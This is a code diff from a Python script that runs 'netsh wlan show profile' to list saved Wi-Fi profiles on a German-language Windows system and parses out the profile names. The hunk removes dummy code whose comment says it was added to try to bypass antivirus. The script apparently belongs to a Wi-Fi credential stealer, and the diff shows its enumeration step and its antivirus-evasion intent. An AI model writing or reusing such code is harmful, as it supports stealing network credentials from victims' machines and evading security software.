@@ -19,12 +19,7 @@ c1  = "netsh wlan show profile"
 sub1 = subprocess.check_output(c1, shell=True, stderr=DEVNULL,stdin=DEVNULL)
 regular_list = re.findall("(?:Benutzer\s:\s)(.*)",sub1)
 
-#irrelevent code just to try bypass antiviress 
-age = 24
-if (age > 18):
-    answer = "u are allowed to buy beer"
-else: answer = "u are a kid, u cannot buy beer"
-# end
+
 result = ""
 
 for regular in regular_list:
